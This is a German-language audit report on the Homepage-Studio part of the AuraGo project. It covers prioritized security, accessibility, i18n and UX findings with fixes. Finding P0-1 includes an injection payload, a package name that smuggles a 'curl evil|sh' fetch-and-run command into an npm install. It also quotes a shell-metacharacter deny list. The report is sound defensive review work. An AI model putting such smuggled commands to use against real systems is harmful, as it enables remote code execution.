# Audit: Homepage-Studio (AuraGo)

**Datum:** 2026-10-23 · **Scope:** `ui/js/desktop/apps/homepage-studio*.js`, `ui/css/desktop-app-homepage-studio.css`, `ui/lang/desktop/*.json`, `internal/tools/homepage_*.go`, `cmd/aurago/homepage_dockerfile.go` sowie die zugehörigen Tests.

## Methodik

Drei Strenge, damit nichts nur behauptet ist:

1. **Statischer Code-Review** – Frontend-JS/CSS/i18n und Backend-Go getrennt durch zwei unabhängige Agenten, danach gegen die Quellen gegengeprüft.
2. **Live-Render-Prüfung** – die echten Studio-Dateien wurden in einer isolierten Harness (`node .tmp_aurago/hp-studio-audit/server.mjs 8731`) mit gemocktem Backend (3 Sites, 6 History-Einträge, SSE-Chat) in Chromium gerendert. Geometrie, Computed Styles, Fokusverhalten, API-Call-Zählung und ARIA-Attribute wurden gemessen. Screenshots: `shot-01…shot-07`.
3. **Gegenprüfung gegen Artefakte** – Befunde, die auf einem Harness-Artefakt beruhen könnten (fehlende Theme-Tokens, fehlendes Chat-CSS, `{{seconds}}`-Interpolation), wurden gegen die echten Quellen und die echte `t()`-Semantik geprüft und **nicht** als Befund gewertet.

Alles als „verifiziert“ markierte ist entweder gemessen oder durch Quelltext belegt.

## Kurzfazit

Die Architektur ist solide: saubere Modultrennung (Haupt-App + Sites + Preview + History), XSS-korrektes Escaping, `sandbox`-ed Preview-Iframe, strikter SSRF-Client, atomarer Revision-Restore, 16 Sprachen mit vollständiger Key-Parität, Fokusringe überall.

Die Schwächen liegen an drei Stellen: **Shell-Injection im Backend**, **stille Datenverluste** (Write-Fehler werden als Erfolg gemeldet) und **eine Frontend-Schicht, die Zustände nicht sauber an assistive Technik oder an den Nutzer kommuniziert** — plus ein Vorschau-Fenster, das optisch das schlechteste Element des Studios ist.

| Bereich | P0 | P1 | P2 | Note |
|---|---|---|---|---|
| Backend Security/Korrektheit | 2 | 4 | 4 | Shell-Injection, stille Write-Fehler |
| Frontend a11y | 3 | 3 | 4 | ARIA-Lücken, Fokusverlust |
| i18n | 1 | 4 | 3 | falsche `t()`-API, Locale-Datum |
| Visual/UX/IA | 1 | 6 | 4 | Toolbar unlesbar, Vorschau zu schmal |

---

## P0 – vor dem nächsten Release

### P0-1 · Shell-Injection über drei unabhängige Pfade (Backend)

Der Container-Befehl ist ein Shell-String; untrusted Text wird unquoted interpoliert.

- `internal/tools/homepage_validation.go:193` – `shellMetachars = ";|&`$(){}[]<>!\\'\""` lässt `\n`, `\r`, Leerzeichen, `#`, `*`, `?` **passieren**. Der Pfad landet unquoted in `cat /workspace/%s` (`homepage_editors.go:63,213,369`) und in `mkdir -p /workspace/%s && echo '%s' | base64 -d > /workspace/%s` (`homepage_editors.go:84,234,390`) – ein Newline im Pfad trennt den Befehl.
- `internal/tools/homepage_build_autofix.go:41,61,73,115,130` – Regex-Captures aus der **Build-Ausgabe** (`[^']+`, `[^ ]+`) gehen unquoted in `npm install %s`. Ein Paketname `x; curl evil|sh; #` führt zur Ausführung. Der einzige Filter lehnt führenden `.`/`/` ab (`:49,:103`).
- `internal/tools/homepage.go:1159` – Paketprüfung ist `strings.ContainsAny(p, ";|&`$(){}")`: Newline, Space, `<`, `>`, `'` und `"` passieren alle; verkettet bei `:1163`, ausgeführt bei `:1186`.

**Fix:** Pfade über `filepath.IsLocal` plus Allowlist `^[A-Za-z0-9._/-]+$` prüfen und mit `shellSingleQuote` (bereits vorhanden in `homepage_deploy_vercel.go:78`) umschließen; NPM-Namen gegen `^(@[a-z0-9-~][a-z0-9-._~]*/)?[a-z0-9-~][a-z0-9-._~]*$` prüfen; Autofix-Captures allowlisten statt filtern.

### P0-2 · Editor meldet Erfolg bei fehlgeschlagenem Write (stiller Datenverlust)

`homepage_editors.go:85,235,391` rufen `DockerExec(...)` auf und **verwerfen das Ergebnis**, danach wird das vorab serialisierte JSON zurückgegeben. Ein fehlgeschlagenes `base64 -d >` liefert damit `"status":"ok"` – der Nutzer glaubt, die Datei sei geschrieben. Gleiches Muster in `homepage_files.go:39-40` (Ergebnis von `stat`/`find` wird ignoriert).

**Fix:** Exit-Code prüfen und bei Fehler ein Fehler-JSON zurückgeben; Test für „Write schlägt fehl → status != ok“.

### P0-3 · `t(key, fallback)` nutzt die falsche API (Frontend, verifiziert)

Der zweite Parameter von `t()` ist eine **Placeholder-Map**, kein Fallback (`ui/js/shared/shared-core.js:15,22-25`). Betroffen: `homepage-studio-sites.js:66` (`t('homepage_studio.sites_drift_' + x, x)`), `homepage-studio-history.js:101` (`t('homepage_studio.history_type_' + x, x)`), `homepage-studio.js:94,181,386`.

Gemessen mit der echten `t()`-Semantik:

```
t('homepage_studio.history_type_note', 'note')  →  "Notiz n und o"   // Fallback wird als Map gelesen
t('homepage_studio.history_type_missing','note') →  "homepage_studio.history_type_missing"
```

Übersetzte Strings, die `{0}`/`{1}` enthalten, werden also beschädigt; fehlende dynamische Keys leaken den Key-Pfad in die Oberfläche. Der Fallback greift **nie**.

**Fix:** `const tr = (k, fb) => { const v = t(k); return v === k ? fb : v; }` und in den genannten Stellen nutzen – oder `tOr` (`shared-core.js:37-48`) über den App-Context bereitstellen (wird aktuell im Desktop-Baum **null** Mal verwendet).

### P0-4 · Preview-Toolbar ist auf hellen Seiten unlesbar (verifiziert)

`.vd-hp-viewport-head` (`ui/css/desktop-app-homepage-studio.css:725-736`) ist `position:absolute; z-index:5` **ohne Hintergrund und ohne `backdrop-filter`**. Gemessen: `background: rgba(0,0,0,0)`, `backdrop-filter: none`, Textfarbe `rgb(232, 241, 255)`. Über einer weißen Landingpage ist die URL deshalb unsichtbar; die inaktiven Geräte-Buttons („Desktop“, „Tablet“) verschwinden vollständig, nur der aktive Pill ist zu sehen (Screenshot `shot-02`).

**Fix:** Toolbar wie der Kopfzeilen-Chrome mit `background: var(--vd-theme-chrome-bg)` + `backdrop-filter` versehen – oder (besser) aus dem Overlay in eine feste Zeile **oberhalb** des Iframes verschieben, damit sie keinen Seiteninhalt überdeckt.

### P0-5 · `aria-live` auf dem gesamten Chat-Log (verifiziert)

`homepage-studio.js:88` setzt `aria-live="polite"` auf das Chat-Log. Dessen Stream-Bubble wird per `requestAnimationFrame` (`homepage-studio.js:866-877, 969-970`) bei **jedem Frame** neu geschrieben → Screenreader lesen den Text fortlaufend vor. Gemessen: die App besitzt genau **zwei** Live-Regionen (`hp-status-pill`, `hp-log`), eine davon ist die falsche.

**Fix:** `aria-live` vom Log entfernen; eine eigene, schmale Statuszeile `aria-live="polite" aria-atomic="true"` nur für die **fertige** Nachricht; während des Streams `aria-busy="true"` am Log.

### P0-6 · Fokusverlust bei jeder Website-Auswahl (verifiziert)

`homepage-studio-sites.js:273` ersetzt das Listen-`innerHTML`; die fokussierte Karte (`:246`, `tabindex="0"`) wird dabei entfernt. Gemessen: `activeElement` wechselt von `ARTICLE.vd-hp-site` → `BODY`. Tastaturnutzer verlieren nach jedem Klick die Position.

**Fix:** vor dem Rewrite `document.activeElement` + `data-site-id` merken, danach auf die neue Karte fokussieren.

### P0-7 · Tablist ohne Pfeiltastennavigation (verifiziert)

`homepage-studio.js:160-166` deklariert `role="tablist"`/`role="tab"`, verdrahtet aber nur `click` (`:457-461`). Gemessen: `ArrowRight` auf einem Tab ändert weder Fokus noch `aria-selected`. Verstoß gegen das WAI-ARIA-Tabs-Pattern; die Repo-Konvention existiert bereits (`ui/js/desktop/apps/calendar.js:607-610`).

**Fix:** inaktive Tabs `tabindex="-1"`, `keydown`-Handler auf dem Tablist für `ArrowLeft/ArrowRight/Home/End` mit Fokus- und Auswahlwechsel.

---

## P1

| # | Befund | Ort | Nachweis |
|---|---|---|---|
| P1-1 | **Geräte-Umschalter ist zu 2/3 wirkungslos.** `Desktop` und `Tablet` rendern beide `100%` der Vorschauzone (516 px), nur `Mobil` greift (`min(390px,100%)`). Im Default-Layout (Zone 540 px) sind Desktop und Tablet pixelgleich. | `desktop-app-homepage-studio.css` (nur `tablet`/`mobile`-Regeln, keine `desktop`-Regel) | gemessen: `desktop {515} / tablet {515} / mobile {389}` |
| P1-2 | **Vorschau bekommt nur 44 % der Breite.** Im 1240-px-Fenster: Chat 360 px, Inspektor 330 px, Vorschau 540 px. In einem preview-first Tool ist die Vorschau die schmalste Spalte. | `homepage-studio.js` (Grid-Defaults) | gemessen: `zone w=540`, `chat w=360`, `insp w=330` |
| P1-3 | **Deploy-URLs auf „htt…“ abgeschnitten** – in „Deploy-Ziele“, „Bereitstellungen“, „Remote-Beobachtungen“ ist die URL als Linktext so gekürzt, dass sie nicht mehr unterscheidbar ist. | `homepage-studio-sites.js` (URL-Chip) | Screenshot `shot-04` |
| P1-4 | **„Agent arbeitet“ hängt über der Vorschau**, nicht in der Chat-Spalte: DOM-Kette `vd-hp-agent-pill → vd-hp-footer → vd-hp-preview-zone`. Der Indikator überdeckt die Scrollbar der Vorschau. | `homepage-studio.js` (Footer im Preview-Zone) | gemessen + Screenshot `shot-07` |
| P1-5 | **Status-Pill beschreibt nicht das gewählte Ziel.** „Webserver läuft“ bleibt stehen, obwohl „ZIEL = Vercel“ gewählt ist und die Vorschau eine 404-Seite (`DEPLOYMENT_NOT_FOUND`) anzeigt. | `homepage-studio.js` (Status aus `status.web_container`) | Screenshot `shot-06` |
| P1-6 | **N+1-Request-Kette.** `loadStatus` → `loadHomepageTargets` lädt die Site-Liste **zweimal** und ruft zusätzlich pro Site einen Detail-Endpunkt ab. Gemessen bei 3 Sites: **7 Requests beim Start** (2× `/sites`, 1× `/webhosts`, 3× `/sites/:id`), **6 Requests pro Zielwechsel**. Bei 30 Sites: 34 bzw. 32 pro Zielwechsel. | `homepage-studio.js:585-622, 440-444` | gemessen über API-Counter |
| P1-7 | **Escape bricht im Textarea keinen laufenden Lauf ab.** Der Keydown-Handler (`homepage-studio.js:463-476`) steigt bei `input, textarea, select` aus – wer während des Laufs tippt, kann nicht abbrechen. | `homepage-studio.js:465-466` | gemessen: Escape im Textarea → kein Abort; Escape außerhalb → Abort |
| P1-8 | **Splitter ohne Wert-Semantik.** Fokussierbarer `role="separator"` ohne `aria-valuenow/min/max`/`aria-controls`; beide Splitter tragen die Panel-Beschriftung, Screenreader melden „Assistent, separator“. | `homepage-studio.js:107,158` | gemessen: alle drei Attribute `null` |
| P1-9 | **Preview-Iframe ohne zugänglichen Namen** – kein `title`, kein `aria-label`; Screenreader melden nur „iframe“. | `homepage-studio-preview.js` | gemessen: `title=null, aria-label=null` |
| P1-10 | **Datumsangaben folgen nicht der App-Sprache.** `toLocaleString()` ohne Locale-Argument → Browser-Sprache, nicht `window.SYSTEM_LANG`. Bei englischer Oberfläche und deutschem Browser: gemischte Datumsformate. | `homepage-studio-sites.js:51-56`, `homepage-studio-history.js:115` | Quelltext + Screenshot |
| P1-11 | **Vercel-Token wird nicht für Redaction registriert.** Netlify tut das (`agent_dispatch_services.go:1267`, `dispatch_cloud.go:511`, `server/netlify_handlers.go:14`), Vercel nicht (`:1366`, `dispatch_cloud.go:636`, `server/vercel_handlers.go:28`) → `security.Scrub` redigiert ihn nicht. | Backend | Quelltext |
| P1-12 | **Nicht-atomare Schreibvorgänge** an 11 Stellen (`os.WriteFile` = truncate+write) u. a. `homepage_proxy.go:61`, `homepage_deploy.go:50,650,1082,1398,1417`, `homepage_files.go:227`, `homepage_templates.go:51`, `homepage_ledger.go:667`. Der korrekte Primitive (`fileutil.WriteFileContext`) existiert bereits, wird aber nur in `homepage_revisions.go:365` genutzt. Ein Absturz mitten im Write hinterlässt eine halbe Datei; `homepage_proxy.go:46` parst sie dann nicht mehr und **verwirft alle Proxy-Routen**. | Backend | Quelltext |
| P1-13 | **Race auf Proxy-Routen.** `RegisterProxyRoute`/`RemoveProxyRoute` (`homepage_proxy.go:66-92`) machen load→modify→save; der Mutex liegt nur *innerhalb* von load/save. | Backend | Quelltext |
| P1-14 | **Race/Doppelanlage in der Registry.** `homepage_registry.go:283-289` macht SELECT→INSERT auf `project_dir`, das nur **indiziert**, nicht `UNIQUE` ist (`:104`) → parallele Registrierung erzeugt zwei Zeilen für ein Verzeichnis. | Backend | Quelltext |
| P1-15 | **Abhängigkeits-Installation meldet falschen Erfolg.** `homepage_pipeline.go:178` verwirft den Unmarshal-Fehler; eine Nicht-JSON-Antwort von `DockerExec` lässt `ExitCode == 0` → „Dependencies installed“, obwohl nichts installiert wurde. | Backend | Quelltext |
| P1-16 | **Nil-Request-Dereferenz.** `homepage_pipeline.go:324` verwirft den Fehler von `newToolHTTPRequest` → bei fehlerhafter Asset-URL ist `req == nil` und `:325` paniked. | Backend | Quelltext |
| P1-17 | **„Änderungen und Gründe“ doppelt.** Beispiel aus dem Render: „Deployment auf Vercel fehlgeschlagen · Fehlgeschlagen“ – Grund und Outcome wiederholen sich. Zudem ist der `reason`-Text ein roher Backend-String, nicht übersetzbar. | `homepage-studio-sites.js:220` | Screenshot `shot-04` |
| P1-18 | **Site-Detail ist eine Textwand** ohne Hierarchie: „Vom Agenten erstellt“, „Lokaler Ordner:“, „Container-Ordner:“, „Zuletzt geprüft:“ stehen als Fließtext; Pfade ohne Monospace/Kopier-Button, keine Aktion „Ordner öffnen“/„URL öffnen“ außer dem abgeschnittenen Link. | `homepage-studio-sites.js` (Detail-Renderer) | Screenshot `shot-04` |
| P1-19 | **Entwurf wird ohne Rückfrage im Verlauf-Tab wiedergeöffnet.** Der Draft-Restore setzt `inspectorTab` aus `localStorage`; beim nächsten Start ist „Verlauf“ statt „Websites“ aktiv. (Funktional korrekt, aber die erwartete Einstiegssicht ist die Site-Liste.) | Draft-Persistenz | gemessen: `historyTabSelected=true` nach Reload |

## P2

| # | Befund | Ort |
|---|---|---|
| P2-1 | Sehr kleine Typografie: Brand-Subline 10,5 px, Status 11 px, Site-Datum 10,5 px, Drift-Badge 10 px, Panel-Label 10,5 px. | `desktop-app-homepage-studio.css` |
| P2-2 | „Löschen“-Button im Verlauf: identisches `aria-label` für alle Einträge (kein Kontext, welcher Eintrag) und sehr kleine Trefferfläche. | `homepage-studio-history.js` |
| P2-3 | Doppelte `<h2>Homepage-Studio</h2>` (Kopfzeile + Willkommensblock), kein `<h1>` im Fenster. | `homepage-studio.js:56, 168` |
| P2-4 | Tote i18n-Keys: `preview_tabs`, `select_target`, `history_type_note` werden nirgends verwendet. | `ui/lang/desktop/*.json` |
| P2-5 | Fremd-Key-Kopplung: der Fortschrittszähler nutzt `desktop.noisemaker_progress_elapsed` aus dem Noisemaker-Feature. | `homepage-studio.js` |
| P2-6 | `dispose()` räumt nicht auf: der 500-ms-Timer `refreshPreview` (`homepage-studio.js:909`) und der Debounce-Timer (`homepage-studio-history.js:35-41`) werden nicht gehalten/gelöscht → Callbacks nach dem Schließen; die Nachlade-Kette (`homepage-studio.js:904-906`) ist nicht gegen `state.disposed` geschützt. | Frontend |
| P2-7 | `safeExternalURL` doppelt implementiert (`homepage-studio.js:575-583`, `homepage-studio-sites.js:41-49`), obwohl die Kopfzeile eine einzige Implementierung behauptet; Drift-Enum ebenfalls doppelt (`homepage-studio.js:382-384` vs. `homepage-studio-sites.js:7-13`). | Frontend |
| P2-8 | `prefers-reduced-motion` (`:1688-1715`) deckt Buttons/Spinner/Skelettone ab, nicht die Input-/Select-Transitions (`:189,576,1369`), die Panelbreite (`:704`) oder den Splitter (`:293`). | CSS |
| P2-9 | Keine `.visually-hidden`-Utility im Studio-CSS (Repo hat sie in `cm-chessboard.css:26`, `dashboard.css:5013`). | CSS |
| P2-10 | Dynamic i18n-Keys (`homepage_studio.sites_drift_*`, `history_type_*`, `history_filter_*`, `sites_reason_*`) sind vom Lint ausgenommen (`desktop_i18n_cleanup_test.go:146,160` matcht nur Literale; `i18n_lint_test.go:1058-1075` kennt keinen Studio-Eintrag) → keine Garantie „in allen 16 Sprachen vorhanden“. | i18n-Test |
| P2-11 | `homepage_studio.default_name` ist in `de`, `it`, `sv` weiterhin englisch; der Fallback-Test prüft nur `fr` (`:45-47`). | i18n |
| P2-12 | `t('desktop.chat_request_failed')` übernimmt einen Key aus dem Chat-Feature; der Fehlertext landet ohne eigene Studio-Formulierung im Chat-Bubble. | i18n |
| P2-13 | Geräte-Umschalter als `aria-pressed`-Toggles statt `role="radiogroup"`/`aria-checked` (Einzelauswahl). | `homepage-studio.js:132-136` |
| P2-14 | `readonly_hint` dient doppelt als Platzhalter und als Hinweistext. | `homepage-studio.js:98,100` |
| P2-15 | Symlink in einem Projekt lässt die **gesamte** Revision-Speicherung scheitern (`homepage_revisions.go:95-97`), obwohl der Netlify-Zip Symlinks bereits überspringt (`:167-171`). | Backend |

## i18n

- **Vollständigkeit:** alle 16 Locales (`en, de, cs, da, el, es, fr, hi, it, ja, nl, no, pl, pt, sv, zh`) enthalten **exakt dieselben 103** `homepage_studio.*`-Keys – keine Lücke, keine Überzählige.
- **Unübersetzt:** 3–13 Werte pro Locale sind identisch zum Englischen (fr 13, da 11, it 9, nl 9, de 8, pt 7, sv 6). Betroffen vor allem `history_type_*`/`history_filter_*` und `device_desktop|tablet|mobile`; `target_*` sind Produktnamen und damit in Ordnung.
- **Fallback-Kette ist serverseitig korrekt:** `internal/i18n/i18n.go:284-297` merged erst Englisch, dann die Locale → Key-fallweise Rückfall auf Englisch. Auf Translator-Ebene existiert **kein** Fallback – `tOr` wird im Desktop-Baum nicht genutzt (siehe P0-3).
- **Nicht übersetzbare Texte:** `purpose`/`guide` im Fenster-Kontext sind hartkodiertes Englisch (`homepage-studio.js:840-841`), während `label` (`:839`) übersetzt ist; Backend-Texte (`drift_message`, `event.reason`, History-Inhalte) erscheinen unverändert.

## Accessibility

**Stärken:** Fokusringe für alle interaktiven Elemente (`:371-379, 632-634, 1397-1400, 1424-1426, 1574-1576`), Icons `aria-hidden` (Fallback-Buchstaben werden nicht vorgelesen), `sandbox`-Iframe, Confirm-Dialog mit Tab-Falle und Fokus-Rückgabe, `role="status"` für den Serverstatus.

**Lücken:** P0-5 (Live-Region), P0-6 (Fokusverlust), P0-7 (Tablist), P1-8 (Splitter-Werte), P1-9 (Iframe-Name). Dazu: Website- und Verlaufsliste sind `<article role="button" aria-pressed>` ohne Listen-Semantik, ohne Pfeiltastennavigation und ohne Auswahl-Bekanntgabe; der „Mehr laden“-Button wird bei jedem Render neu erzeugt und verliert den Fokus; der Vorschau-Ladezustand startet `aria-hidden="true"` und wird nur auf `false` umgestellt, ohne eine Ansage; die Verlaufs- und Seitenstatus (Laden/leer/Fehler) haben keine Live-Region.

## Backend-Sicherheit

**Sauber implementiert und nicht zu beanstanden:** kein `sh -c`-Exec (die einzige Shell-Stelle ist argv-basiertes `git`); SSRF-Schutz über `security.NewStrictPublicHTTPClientForURL` (`homepage_remote.go:35-53`) mit redirect-gebundenem Client für konfigurierte Origins; Quick-Origin mit `os.OpenRoot`, Host-Header-Gate, Datei-Allowlist und `nosniff`; Netlify-Zip überspringt Symlinks und Credentials und begrenzt Anzahl/Größe; Restore ist symlinksicher und atomar; `homepage_files.go`/`homepage_editors.go` nutzen `docker exec` statt Host-Shell.

**Offen:** P0-1 (Injection), P0-2 (stiller Write-Fehler), P1-11 (Token-Redaction), P1-12 (Atomarität), P1-13/14 (Races), P1-16 (Nil-Deref), sowie `resolveHomepagePath` (`homepage_validation.go:223-231`) ohne `filepath.EvalSymlinks` → ein Symlink im Workspace schreibt auf dem lokalen Pfad aus dem Workspace heraus.

## Tests

**Vorhanden:** Registry-Identität, Revision-Delta/Hash, Restore-Sicherheit, Netlify-Zip-Limits, Proxy-CRUD, Quick-Origin-Lifecycle, Deploy-Recording, Blocked-Exec, i18n-Key-Parität (14 Keys × 16 Locales), Draft-Persistenz, Preview-URL-Matrix, iframe-Sandbox, Chat-Payload-Scope.

**Lücken (der Kern):** `ui/desktop_homepage_studio_test.go` ist ein **Marker-Test** – er prüft Substrings im Quelltext, nicht Verhalten. Er pinnt z. B. die Zeichenkette `'focus-visible'` und die Preview-URL-Matrix, kann aber keinen Logik-Regressionsbruch fangen. Ungetestet bleiben: alle Tastaturpfade (Tablist-Pfeile, Splitter, Listennavigation), Fokusverhalten, Live-Region-Inhalte, `dispose()`-Lifecycle, der Chat-Stream/Abort/Fehlerpfad, `switchPanel`, Draft-Restore, Reconcile-/Delete-Flows, locale-aware Datumsformatierung und die ~24 dynamischen i18n-Keys. Die Browser-Smoke-Tests laufen **nur** mit `AURAGO_RUN_BROWSER_SMOKE=1` (`ui/precision_workspace_browser_test.go:14-18`), sind also im Default-Lauf nicht aktiv.

---

## Empfohlene Reihenfolge

**Slice 1 – Sicherheit (Backend, ein PR):** P0-1, P1-11, P1-12 (mit Ausnahme `homepage_deploy.go:650`, dort ist die Datei in Caddy eingebunden – in ein gemountetes *Verzeichnis* schreiben), P1-13, P1-14, P1-16.

**Slice 2 – Datenintegrität (Backend):** P0-2, P1-15, plus Tests „Write schlägt fehl → status != ok“ und „nicht-JSON-Antwort → kein Erfolg“.

**Slice 3 – i18n-Korrektheit (Frontend, klein):** P0-3, P1-10, P1-17, P2-4, P2-10, P2-11.

**Slice 4 – a11y (Frontend, ein PR):** P0-5, P0-6, P0-7, P1-8, P1-9, P2-1, P2-2, P2-3. Dazu ein Browser-Test (gated auf `AURAGO_RUN_BROWSER_SMOKE=1`), der `ArrowRight` auf dem Tablist fährt und `aria-selected` + Fokuswechsel prüft.

**Slice 5 – Vorschau/UX (Frontend, größer):** P0-4, P1-1, P1-2, P1-3, P1-4, P1-5, P1-17, P1-18, P2-13.

**Slice 6 – Performance/Hygiene:** P1-6 (Cache für Sites+Details, `/sites`-Doppelabruf entfernen), P2-6, P2-7, P2-8, P2-9.

**Slice 7 – Tests:** Verhaltenstests statt Marker-Tests für die Kernpfade; Browser-Smoke-Tests in CI aktivieren.

### Konzeptionelle Leitidee für Slice 5

Das Studio ist heute ein **Chat mit Beiwerk** – 690 px von 1240 px gehen an Chat und Inspektor, 540 px an die Vorschau, und der wichtigste Output (die gebaute Seite) hat die kleinste Fläche und eine unlesbare Bedienleiste. Vorschlag: die Vorschau zur Leitfläche machen – Chat auf eine schmale, einklappbare Spur (280–320 px), Inspektor auf 300 px, Vorschau auf den Rest (`flex: 1`), Toolbar als feste Zeile über dem Iframe statt als Overlay, Geräte-Umschalter mit echten Breiten (1280/768/390 px, skaliert dargestellt, mit angezeigter Pixelbreite), Sites und Verlauf als Overlay-Panels auf der Vorschau statt als dritte Dauerspalte.
